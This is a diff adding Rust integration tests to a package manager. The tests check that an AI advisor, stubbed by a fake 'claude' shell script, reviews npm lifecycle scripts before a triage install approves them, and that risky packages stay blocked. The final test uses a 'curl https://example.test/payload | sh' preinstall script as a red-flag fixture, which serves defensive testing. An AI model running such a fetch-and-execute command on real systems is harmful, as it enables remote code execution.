@@ -553,3 +553,131 @@ fn prepend_to_path(dir: &Path) -> std::ffi::OsString {
     paths.extend(std::env::split_paths(&original));
     std::env::join_paths(paths).expect("PATH join")
 }
+
+#[cfg(unix)]
+#[tokio::test]
+async fn advisor_reviews_green_delegated_phases_before_approving_a_mixed_lifecycle() {
+    assert_delegated_phases_are_reviewed(
+        serde_json::json!({"preinstall": "node build.js", "postinstall": "node install.js"}),
+        None,
+        true,
+    )
+    .await;
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn advisor_reviews_identity_matched_delegates_before_approval() {
+    assert_delegated_phases_are_reviewed(
+        serde_json::json!({"postinstall": "node install.js"}),
+        Some("https://github.com/vendor/synthetic-amber-dep"),
+        true,
+    )
+    .await;
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn advisor_reviews_a_green_delegate_without_an_amber_sibling() {
+    assert_delegated_phases_are_reviewed(
+        serde_json::json!({"postinstall": "node build.js"}),
+        None,
+        true,
+    )
+    .await;
+}
+
+#[cfg(unix)]
+async fn assert_delegated_phases_are_reviewed(
+    scripts: serde_json::Value,
+    repository: Option<&str>,
+    expect_review: bool,
+) {
+    use std::os::unix::fs::PermissionsExt;
+
+    let mock = MockRegistry::start().await;
+    let tarball = make_tarball_from_pkg_json(
+        serde_json::json!({
+            "name": AMBER_DEP_NAME,
+            "version": AMBER_DEP_VERSION,
+            "scripts": scripts, "repository": repository
+        }),
+        &[
+            (
+                "build.js",
+                b"// REVIEW_REQUIRED_DELEGATE\nprocess.exit(0);\n",
+            ),
+            (
+                "install.js",
+                if repository.is_some() {
+                    b"// REVIEW_REQUIRED_DELEGATE\nprocess.exit(0);\n".as_slice()
+                } else {
+                    INSTALL_JS_BODY
+                },
+            ),
+        ],
+    );
+    mount_amber_dep(&mock, &tarball).await;
+    let project = TempProject::empty(&triage_project_manifest());
+    write_signed_unlock(&project, &["scripts-triage"]);
+    let provider = tempfile::tempdir().unwrap();
+    let binary = provider.path().join("claude");
+    std::fs::write(
+        &binary,
+        "#!/bin/sh\nif [ \"$1\" = \"--version\" ]; then echo fixture-1; exit 0; fi\nprompt=$(cat)\nprintf '%s\\n' \"$prompt\" >> \"$LPM_TEST_ADVISOR_PROMPTS\"\ncase \"$prompt\" in *REVIEW_REQUIRED_DELEGATE*) echo MANUAL;; *) echo APPROVE;; esac\n",
+    ).unwrap();
+    std::fs::set_permissions(&binary, std::fs::Permissions::from_mode(0o755)).unwrap();
+    let prompts = provider.path().join("prompts.txt");
+    let output = lpm_with_registry(&project, &mock.url())
+        .env("PATH", prepend_to_path(provider.path()))
+        .env("LPM_TEST_ADVISOR_PROMPTS", &prompts)
+        .env("LPM_L4_CACHE", "0")
+        .args([
+            "install",
+            "--triage",
+            "--auto-build",
+            "--advisor=claude-cli",
+            "--no-skills",
+            "--no-editor-setup",
+        ])
+        .output()
+        .unwrap();
+    let stderr = String::from_utf8_lossy(&output.stderr);
+    assert!(output.status.success(), "{stderr}");
+    let prompts = std::fs::read_to_string(prompts).unwrap();
+    assert_eq!(
+        prompts.contains(AMBER_DEP_NAME),
+        expect_review,
+        "unexpected review scope: {prompts}"
+    );
+    if expect_review {
+        assert!(
+            prompts.contains("REVIEW_REQUIRED_DELEGATE"),
+            "unreviewed delegated file: {prompts}"
+        );
+    }
+    let state: serde_json::Value =
+        serde_json::from_str(&project.read_file(".lpm/build-state.json")).unwrap();
+    assert!(
+        state["blocked_packages"]
+            .as_array()
+            .unwrap()
+            .iter()
+            .any(|p| p["name"] == AMBER_DEP_NAME),
+        "{state}"
+    );
+    assert!(
+        !project
+            .path()
+            .join("node_modules")
+            .join(AMBER_DEP_NAME)
+            .join(".lpm-built")
+            .exists()
+    );
+}
+
+#[cfg(unix)]
+#[tokio::test]
+async fn advisor_does_not_review_a_package_with_a_red_sibling_phase() {
+    assert_delegated_phases_are_reviewed(serde_json::json!({"preinstall": "curl https://example.test/payload | sh", "postinstall": "node install.js"}), None, false).await;
+}
